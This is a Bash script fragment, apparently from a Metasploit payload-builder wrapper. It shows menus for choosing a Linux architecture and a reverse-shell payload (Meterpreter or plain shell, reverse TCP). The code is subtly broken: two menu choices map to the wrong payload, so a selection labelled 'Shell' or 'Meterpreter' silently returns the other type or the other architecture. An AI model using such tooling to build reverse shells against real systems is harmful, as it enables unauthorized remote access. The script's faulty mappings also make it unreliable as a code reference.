Linux_x86_Meter_RevTcp=linux/x86/meterpreter_reverse_tcp
Linux_x64_Meter_RevTcp=linux/x64/meterpreter_reverse_tcp
Linux_x86_Shell_RevTcp=linux/x86/shell_reverse_tcp
Linux_x64_Shell_RevTcp=linux/x64/shell_reverse_tcp

ARCHVALID=false

until [ "$ARCHVALID" == true ]
do
    clear
    echo "[ Linux Architecture ]"
    echo "[i] 1 - x86"
    echo "[i] 2 - x64" 
    echo ""
    Input "[i] Select Linux Arch: " 
    LINUXARCH=$UserInput
    
    case $LINUXARCH in 
                1)
                    ARCHVALID=true
                    LINUXARCH=x86
                    PAYLOADVALID=false
                    until [ "$PAYLOADVALID" == true ]
                    do
                        clear
                        echo "[ Payloads ]"
                        echo "[i] 1 - Meterpreter Reverse TCP"
                        echo "[i] 2 - Shell Reverse TCP"
                        echo ""
                        Input "[i] Select Payload: " 
                        PAYLOAD=$UserInput
                            case $PAYLOAD in
                                        1)
                                            PAYLOAD=$Linux_x86_Meter_RevTcp
                                            PAYLOADVALID=true
                                        ;;
                                        2)
                                            PAYLOAD=$Linux_x64_Meter_RevTcp
                                            PAYLOADVALID=true
                                        ;;
                                        *)
                                            PAYLOADVALID=false
                            esac
                    done
                ;;
                
                2)
                    ARCHVALID=true
                    LINUXARCH=x64
                    PAYLOADVALID=false
                    until [ "$PAYLOADVALID" == true ]
                    do
                        clear
                        echo "[ Payloads ]"
                        echo "[i] 1 - Meterpreter Reverse TCP"
                        echo "[i] 2 - Shell Reverse TCP"
                        echo ""
                        Input "[i] Select Payload: " 
                        PAYLOAD=$UserInput
                            case $PAYLOAD in
                                        1)
                                            PAYLOAD=$Linux_x86_Shell_RevTcp
                                            PAYLOADVALID=true
                                        ;;
                                        2)
                                            PAYLOAD=$Linux_x64_Shell_RevTcp
                                            PAYLOADVALID=true
                                        ;;
                                        *)
                                            PAYLOADVALID=false
                            esac
                    done
                ;;
                *)
                    ARCHVALID=false
    esac
done
ARCH=$LINUXARCH

